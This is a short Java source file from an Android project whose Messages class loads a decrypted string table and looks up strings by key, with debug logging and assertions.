package com.android.deviceinfo;

import java.util.HashMap;
import java.util.MissingResourceException;

import android.content.Context;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class Messages {
	private static final String TAG = "Messages"; //$NON-NLS-1$

	private static HashMap<String, String> messages;
	private static boolean initialized;

	private static MessagesDecrypt md;

	private Messages() {
	}

	public synchronized static void init(Context context) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (init)");
		}
		md = new MessagesDecrypt(context);
		messages = md.getMessages();
		initialized = messages != null;
		if (Cfg.DEBUG) {
			Check.log(TAG + " (init), initialized: " + initialized );
			if(initialized){
				Check.log(TAG + " (init), messages: " + messages.size() );
			}
		}
	}

	public static String getString(String key) {
		if (!initialized) {
			init(Status.getAppContext());
		}

		try {
			if (Cfg.DEBUG) {
				Check.asserts(messages.containsKey(key), "no key known: " + key); //$NON-NLS-1$
			}

			String str = messages.get(key);
			return str;
		} catch (MissingResourceException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return '!' + key + '!';
		}
	}

}
